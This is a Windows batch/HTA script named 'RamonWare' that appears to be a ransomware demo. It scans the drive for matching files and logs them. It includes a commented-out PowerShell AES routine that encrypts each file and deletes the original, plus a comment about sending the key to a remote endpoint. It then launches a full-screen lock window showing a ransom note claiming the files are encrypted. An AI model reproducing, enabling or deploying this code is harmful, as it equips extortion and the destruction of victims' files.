<!-- :: Batch Section
@Echo OFF
mode con:cols=50 lines=2

Title Ramon Ware

echo Scanning. . . .

REM Scan only: list matching files. Nothing is encrypted or deleted.
set ROOT_PATH=%homedrive%\
FOR /R "%ROOT_PATH%" %%X in (*.labasset) DO (
    echo %%X >> %homedrive%\Original.txt
    REM Encryption would happen here. Each listed file would be encrypted
    REM and the original would be deleted, so the owner could not open it.
    REM This step is not implemented: the script only finds files and logs them.
    REM PowerShell AES (uncomment to activate). Encrypts the file; del removes the original.
    REM The password should be generated on this machine, sent to a remote endpoint, then erased from the PC. It must not stay stored locally.
    REM powershell -NoProfile -Command "function Protect-LabFile($Path,$Pass){ $aes=[Security.Cryptography.Aes]::Create(); $aes.Key=[Security.Cryptography.Rfc2898DeriveBytes]::new($Pass,[byte[]](1..16),10000).GetBytes(32); $aes.GenerateIV(); $b=[IO.File]::ReadAllBytes($Path); $c=$aes.CreateEncryptor().TransformFinalBlock($b,0,$b.Length); [IO.File]::WriteAllBytes($Path+'.aes',$aes.IV+$c) }; Protect-LabFile '%%X' '%pass%'"
    REM del "%%X"
)

REM Block Screen
cls
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

-->

<html>
    <head>
        <title>RamonWare</title>
    <hta:application id="lockScreen" 
                     applicationname="RamonWare"  
                     version="1.0" 
                     maximizebutton="no" 
                     minimizebutton="no" 
                     sysmenu="no" 
                     Caption="no" 
                     windowstate="maximize"/> 
    <style>
        #ransomNote{
            padding-top: 19%;
            letter-spacing: 1px;
            text-align: center;
        }
    </style>
</head>
<body bgcolor="#8c1d1d" scroll="no">
    <font face="Lucida Console" size="4" color="white">
<center><p> - RamonWare - </p></center>
<div id="ransomNote">
    Ooops, your files have been encrypted!<br>
    <br><br>
    Your important files are encrypted. Nobody can recover your files without our decryption service.<br>
    <br><br>
   Github.com/SegoCode<br>
    <br><br><br>
    <img id="lockIcon" alt="Lock" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
</div>
</body>
</html>
